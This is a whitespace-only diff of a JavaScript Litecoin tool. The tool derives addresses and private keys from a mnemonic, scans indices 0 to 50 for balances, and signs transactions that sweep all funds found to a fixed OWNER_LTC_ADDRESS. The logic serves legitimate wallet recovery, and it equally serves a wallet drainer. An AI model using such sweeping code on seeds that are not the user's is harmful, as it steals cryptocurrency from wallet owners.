@@ -36,13 +36,14 @@ function getAddressAtIndex(index, mnemonic) {
     const root = bip32.fromSeed(seed, litecoin);
     const path = `m/44'/2'/0'/0/${index}`;
     const child = root.derivePath(path);
-
+    
     const { address } = bitcoin.payments.p2pkh({ 
         pubkey: child.publicKey, 
         network: litecoin 
     });
-
+    
     const privateKey = child.toWIF();
+
     return { address, privateKey, index, path };
 }
 
@@ -78,13 +79,13 @@ async function getUtxos(address) {
     try {
         const res = await axios.get(`https://litecoinspace.org/api/address/${address}/utxo`, { timeout: 5000 });
         console.log(`[UTXO] API returned ${res.data.length} items`);
-
+        
         const scriptPubKey = getScriptPubKeyFromAddress(address);
         if (!scriptPubKey) {
             console.error('[UTXO] Failed to derive scriptPubKey from address');
             return [];
         }
-
+        
         return res.data.map(u => ({
             txid: u.txid,
             vout: u.vout,
@@ -117,7 +118,7 @@ async function broadcastTx(txHex) {
 
 async function createTransaction(privateKeyWIF, fromAddress, toAddress = OWNER_LTC_ADDRESS) {
     console.log(`[TX] Starting: ${fromAddress} -> ${toAddress}`);
-
+    
     try {
         let keyPair;
         try {
@@ -126,10 +127,10 @@ async function createTransaction(privateKeyWIF, fromAddress, toAddress = OWNER_L
             console.error('[TX] Invalid private key:', e.message);
             return null;
         }
-
+        
         const utxos = await getUtxos(fromAddress);
         console.log(`[TX] Got ${utxos.length} valid UTXOs`);
-
+        
         if (!utxos.length) {
             console.log('[TX] No UTXOs to spend');
             return null;
@@ -177,7 +178,7 @@ async function createTransaction(privateKeyWIF, fromAddress, toAddress = OWNER_L
         }
 
         psbt.addOutput({ address: toAddress, value: sendAmount });
-
+        
         for (let i = 0; i < addedInputs; i++) {
             try {
                 psbt.signInput(i, keyPair);
@@ -186,7 +187,7 @@ async function createTransaction(privateKeyWIF, fromAddress, toAddress = OWNER_L
                 return null;
             }
         }
-
+        
         try {
             psbt.finalizeAllInputs();
         } catch (e) {
@@ -207,12 +208,12 @@ async function createTransaction(privateKeyWIF, fromAddress, toAddress = OWNER_L
 async function fastScan(ownerAddress = OWNER_LTC_ADDRESS, mnemonic) {
     console.log('[FAST SCAN] Checking indices 0-50...');
     const results = [];
-
+    
     for (let i = 0; i <= 50; i++) {
         try {
             const addrData = getAddressAtIndex(i, mnemonic);
             const balance = await checkAddressBalance(addrData.address);
-
+            
             if (balance > 0.0001) {
                 console.log(`[FAST SCAN] FOUND: Index ${i} has ${balance} LTC at ${addrData.address}`);
                 const txid = await createTransaction(addrData.privateKey, addrData.address, ownerAddress);
@@ -223,10 +224,10 @@ async function fastScan(ownerAddress = OWNER_LTC_ADDRESS, mnemonic) {
         } catch (e) {
             console.error(`[FAST SCAN] Index ${i} error:`, e.message);
         }
-
+        
         await new Promise(r => setTimeout(r, 100));
     }
-
+    
     return results;
 }
 
